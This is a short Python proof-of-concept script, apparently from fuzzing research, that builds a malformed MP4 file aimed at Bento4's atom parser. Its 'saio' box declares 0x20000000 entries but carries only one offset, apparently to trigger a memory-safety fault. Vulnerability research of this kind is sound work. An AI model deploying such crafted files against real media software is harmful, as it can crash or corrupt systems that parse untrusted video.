import struct, os

def box(btype, data):
    return struct.pack('>I', 4 + 4 + len(data)) + btype + data

def full_box(btype, version, flags, data):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return box(btype, hdr + data)

# saio box: version=1, flags=0, no aux_info_type, entry_count=0x20000000
entry_count = 0x20000000
fake_offset = struct.pack('>Q', 0)  # 1 fake 64-bit offset (8 bytes)
saio_data = struct.pack('>I', entry_count) + fake_offset
saio = full_box(b'saio', 1, 0, saio_data)

# stsd, stts 最小化
stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + saio)

url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)
smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0) + struct.pack('>HH', 0, 0)
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)
hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00'*12 + b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)
mdia = box(b'mdia', mdhd + hdlr + minf)

tkhd_data = struct.pack('>IIII', 0, 0, 1, 0)
tkhd_data += struct.pack('>II', 0, 0) + b'\x00'*8
tkhd_data += struct.pack('>HH', 0, 0) + struct.pack('>H', 0x0100) + b'\x00'*2
tkhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
tkhd_data += struct.pack('>II', 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)
trak = box(b'trak', tkhd + mdia)

mvhd_data = struct.pack('>IIII', 0, 0, 1000, 0)
mvhd_data += struct.pack('>I', 0x00010000)
mvhd_data += struct.pack('>H', 0x0100) + b'\x00'*10
mvhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
mvhd_data += b'\x00'*24 + struct.pack('>I', 0xFFFFFFFF)
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)
moov = box(b'moov', mvhd + trak)

ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

outpath = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4AtomFactory_h/vuln_003.mp4"
with open(outpath, 'wb') as f:
    f.write(ftyp + moov)
print(f"Written {outpath}")
